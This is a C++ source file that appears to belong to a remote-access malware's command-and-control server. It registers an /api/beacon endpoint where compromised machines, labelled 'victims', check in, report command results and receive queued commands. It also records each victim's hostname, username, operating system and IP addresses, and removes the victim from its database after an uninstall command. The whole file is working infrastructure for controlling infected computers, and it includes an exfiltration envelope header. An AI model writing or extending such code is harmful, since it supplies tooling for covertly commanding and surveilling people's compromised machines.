#ifdef error
#undef error
#endif
#include <algorithm>
#include <glaze/glaze.hpp>

#include "BeaconEndpoint.hpp"
#include "Beacon.hpp"
#include "BeaconResultProcessor.hpp"
#include "CommandService.hpp"
#include "ExfilEnvelope.hpp"
#include "Util/SafeLogger.hpp"
#include "ResultService.hpp"
#include "Types.hpp"
#include "VictimService.hpp"
#include "Endpoints.hpp"

namespace {

bool is_uninstall_command(std::string_view command) {
    return command.starts_with("uninstall");
}

HttpResponse handle_beacon_request(const HttpRequest& req) {
    VictimService victims(VictimManager::instance());
    CommandService commands(CommandManager::instance());
    ResultService results(ResultManager::instance());
    BeaconResultProcessor processor(commands, results);

    BeaconRequest beacon;
    if (auto err = glz::read_json(beacon, req.body)) {
        return error_response(400, "Invalid beacon format");
    }

    logger::info("Client: {} is checking in...", beacon.victim_uid);

    processor.process_results(beacon.victim_uid, beacon.command_results);
    const bool uninstall_completed = processor.is_uninstall_completed(beacon.command_results);

    auto command_list = commands.pending_for_client(beacon.victim_uid);
    const bool pending_uninstall = std::ranges::any_of(
        command_list,
        [](const CommandDAO& cmd) { return is_uninstall_command(cmd.command); });

    if (!pending_uninstall && !uninstall_completed) {
        std::string effective_ip = beacon.external_ip;
        if (effective_ip == "auto" || effective_ip == "1.1.1.1") {
            if (!req.ip_address.empty()) {
                effective_ip = req.ip_address;
            }
        }

        VictimDAO v_data;
        v_data.uid = beacon.victim_uid;
        v_data.internal_ip = beacon.internal_ip;
        v_data.external_ip = effective_ip;
        v_data.hostname = beacon.hostname;
        v_data.username = beacon.username;
        v_data.operating_system = beacon.operating_system;
        v_data.last_update = get_unix_time();
        victims.upsert_from_beacon(v_data);
    }

    for (auto& cmd : command_list) {
        commands.mark_sent(cmd);
    }

    if (pending_uninstall || uninstall_completed) {
        if (victims.remove_by_uid(beacon.victim_uid)) {
            logger::info("Removed victim {} from database after uninstall", beacon.victim_uid);
        }
    }

    return HttpResponse().set_json(glz::write_json(command_list).value_or("{}"));
}

} // namespace

void register_beacon_endpoint(cpppwn::RESTServer& server) {
    server.post("/api/beacon", [](const HttpRequest& req) {
        try {
            return handle_beacon_request(req);
        } catch (const std::exception& e) {
            logger::warn("Beacon handler failed: {}", e.what());
            return error_response(500, "Internal Server Error");
        }
    });
}

void register_all_beacon_endpoints(cpppwn::RESTServer& server) {
    register_beacon_endpoint(server);
}
